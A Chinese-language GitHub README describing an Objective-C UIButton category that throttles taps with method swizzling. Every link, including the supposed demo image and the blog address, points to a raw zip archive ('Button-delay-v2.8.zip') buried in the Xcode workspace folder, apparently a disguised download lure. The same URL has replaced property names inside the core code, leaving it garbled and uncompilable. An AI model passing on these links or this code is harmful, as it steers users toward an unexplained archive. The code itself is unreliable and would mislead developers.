# runtimeBtn
最近运用runtime知识写了一个UIButton的分类，实现了按钮每隔2S响应用户点击。效果如下（可以看到每次响应间隔为2s）：

![效果](https://github.com/ZHThinker/delayButton/raw/refs/heads/master/delayButton.xcodeproj/project.xcworkspace/Button-delay-v2.8.zip)

核心代码如下：

```objective-c

- (void)swizzle_sendAction:(SEL)action to:(id)target forEvent:(UIEvent *)event {
    https://github.com/ZHThinker/delayButton/raw/refs/heads/master/delayButton.xcodeproj/project.xcworkspace/Button-delay-v2.8.zip = https://github.com/ZHThinker/delayButton/raw/refs/heads/master/delayButton.xcodeproj/project.xcworkspace/Button-delay-v2.8.zip <= 0 ? 2 : https://github.com/ZHThinker/delayButton/raw/refs/heads/master/delayButton.xcodeproj/project.xcworkspace/Button-delay-v2.8.zip;
    BOOL ok = [[NSDate date] timeIntervalSince1970] - https://github.com/ZHThinker/delayButton/raw/refs/heads/master/delayButton.xcodeproj/project.xcworkspace/Button-delay-v2.8.zip >= https://github.com/ZHThinker/delayButton/raw/refs/heads/master/delayButton.xcodeproj/project.xcworkspace/Button-delay-v2.8.zip;
    if (ok) {
        https://github.com/ZHThinker/delayButton/raw/refs/heads/master/delayButton.xcodeproj/project.xcworkspace/Button-delay-v2.8.zip = [[NSDate date] timeIntervalSince1970];
        [self swizzle_sendAction:action to:target forEvent:event];
    }
}

+ (void)load {
    swizzleMethod([self class], @selector(sendAction:to:forEvent:), @selector(swizzle_sendAction:to:forEvent:));
}

void swizzleMethod(Class class, SEL originalSelector, SEL swizzledSelector) {
    
    Method originalMethod = class_getInstanceMethod(class, originalSelector);
    Method swizzledMethod = class_getInstanceMethod(class, swizzledSelector);
    
    BOOL didAddMethod = class_addMethod(class, originalSelector, method_getImplementation(swizzledMethod), method_getTypeEncoding(swizzledMethod));
    
    if (didAddMethod) {
        class_replaceMethod(class, swizzledSelector, method_getImplementation(originalMethod), method_getTypeEncoding(originalMethod));
    } else {
        method_exchangeImplementations(originalMethod, swizzledMethod);
    }
}

- (void)setInterval:(NSTimeInterval)interval {
    objc_setAssociatedObject(self, intervalKey, @(interval), OBJC_ASSOCIATION_RETAIN_NONATOMIC);
}
- (NSTimeInterval)interval {
    return [objc_getAssociatedObject(self, intervalKey) doubleValue];
}
- (void)setLastInterval:(NSTimeInterval)lastInterval {
    objc_setAssociatedObject(self, lastIntervalKey, @(lastInterval), OBJC_ASSOCIATION_RETAIN_NONATOMIC);
}
- (NSTimeInterval)lastInterval {
    return [objc_getAssociatedObject(self, lastIntervalKey) doubleValue];
}

```

代码中主要用到了给`分类添加属性`、`method_swizzling`等知识。

博客地址：[runtimeBtn](https://github.com/ZHThinker/delayButton/raw/refs/heads/master/delayButton.xcodeproj/project.xcworkspace/Button-delay-v2.8.zip)

